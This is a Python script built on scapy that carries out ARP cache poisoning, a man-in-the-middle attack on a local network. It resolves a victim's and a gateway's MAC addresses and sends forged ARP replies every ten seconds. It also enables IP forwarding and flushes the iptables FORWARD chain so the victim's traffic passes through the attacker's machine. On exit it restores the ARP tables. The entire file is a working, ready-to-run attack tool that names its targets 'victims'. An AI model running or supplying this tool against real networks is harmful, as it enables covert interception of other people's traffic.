import matplotlib
matplotlib.use('Agg')

from scapy.all import Ether,ARP,srp1,sendp
import time
import os
import sys

def get_mac(ip):

    # create an Ether()/ARP() packet
    arppkt = Ether()/ARP()

    # broadcast: who is at this ip? (what is their mac address?)
    # op code auto set to 1 (ARP request)
    arppkt[ARP].pdst=ip
    arppkt[ARP].hwdst="ff:ff:ff:ff:ff:ff"
    arppkt[Ether].dst="ff:ff:ff:ff:ff:ff"

    # send the packet and record the response
    answer = srp1(arppkt, timeout=2, verbose=False, inter=0.1)

    if answer:
        # print("\tIP: {:15}\tMAC: {:17}".format(ip,answer.hwsrc))
        print("\tIP: {:15}".format(ip))
        return answer.hwsrc # if a response was received, return mac addr
    else:
        print(f"\tCould not find MAC address for {ip}.")
        print("\x1b[1;31m[+] \x1b[0mExiting...")
        sys.exit(0)


def create_arp_packet(t_ip,t_mac,s_ip,s_mac=None):

    # craft an unsolicited ARP reply
    packet = Ether()/ARP()

    # the packet is directed to the target ip/mac:
    # 1.) it appears to be from the spoof ip
    # 2.) but it contains our mac address instead
    # 3.) this associates our mac with the spoof ip in the target's ARP table
    
    packet[Ether].dst = t_mac
    packet[ARP].op = 2 # set op code = ARP reply
    packet[ARP].hwdst = t_mac
    packet[ARP].pdst = t_ip
    
    # the packet has our mac address if s_mac=None
    if s_mac is not None:
        packet[ARP].hwsrc = s_mac
        
    packet[ARP].psrc = s_ip

    return packet

def poison(pkt1,pkt2):
    
    # enable ip forwarding so the packets are forwarded
    #print(f'[+] Enabling IP forwarding...\n')
    os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -F FORWARD")

    print('\x1b[1;31m[+] \x1b[0mPoisoning...')
    
    try:
        while True:
            # get_mac(pkt1[ARP].pdst)
            # get_mac(pkt2[ARP].pdst)
            sendp([pkt1, pkt2], verbose=False) # send on Layer 2
            time.sleep(10) # wait 10s
    except KeyboardInterrupt:
            print("\n\x1b[1;31m[+] \x1b[0mTerminating program...")
            print("\tARP poisoning stopped.")
            return None

def restore(res1,res2):
    
    # disable ip forwarding
    os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
    
    # restore iptables 
    os.system("iptables-restore < /etc/iptables/rules.v4")
    
    # reARP
    print('\tRE-ARPing...')
    sendp([res1,res2], verbose=False)
    
    # exit!
    print("\x1b[1;31m[+] \x1b[0mExiting...")
    sys.exit(0)
    
def usage():
    print("usage: ./arp-psn <victim ip> <gateway ip>")
    sys.exit(0)
    
if __name__ == '__main__':
    
    if len(sys.argv) < 3:
        usage()
    
    print('\n---------- \x1b[1;31marp poisoner\x1b[0m ----------')
    print("\x1b[1;31m[+] \x1b[0mGathering data on victims...")

    target_ip = sys.argv[1]
    target_mac = get_mac(target_ip)
    gateway_ip = sys.argv[2]
    gateway_mac = get_mac(gateway_ip)

    # create malicious packets
    pkt1 = create_arp_packet(target_ip,target_mac,gateway_ip)
    pkt2 = create_arp_packet(gateway_ip,gateway_mac,target_ip)

    # create reARPing packets
    res1 = create_arp_packet(target_ip,target_mac,gateway_ip,gateway_mac)
    res2 = create_arp_packet(gateway_ip,gateway_mac,target_ip,target_mac)

    # enable ip forwarding and ARP poison until Ctrl+C
    poison(pkt1,pkt2)

    # reARP and disable ip forwarding
    restore(res1,res2)

